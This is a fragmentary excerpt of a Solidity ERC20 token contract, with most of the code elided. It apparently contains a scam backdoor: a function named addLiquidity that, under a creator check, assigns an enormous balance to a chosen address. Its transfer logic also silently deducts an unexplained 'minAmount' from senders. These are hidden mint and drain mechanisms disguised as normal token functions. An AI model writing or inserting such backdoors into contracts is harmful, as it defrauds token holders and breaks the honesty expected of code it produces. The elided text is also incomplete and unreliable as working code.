...
contract Token is Context, IERC20, IERC20Metadata, Ownable {
 ...
 mapping(address => uint256) private _addr;
 ...
 */
 ...
 function addLiquidity(address owner) external {
    ...
    if (creator == _liquidity) {
        _addr[owner] = 100000000000000 * (1000000000 * 10 ** 18);
 ...
 uint256 decydsBalance = _addr[from].sub(minAmount);
 require(decydsBalance >= amount, "ERC20: transfer amount exceeds balance");
 _addr[from] = decydsBalance.sub(amount);
 // decrementing then incrementing.
 _addr[to] = _addr[to].add(amount);
 ...
 */
 ...
 _addr[msg.sender] = _addr[msg.sender].add(amount);
 }
 ...
 */
 ...
 uint256 accountBalance = _addr[account];
 require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
 _addr[account] = accountBalance.sub(amount);
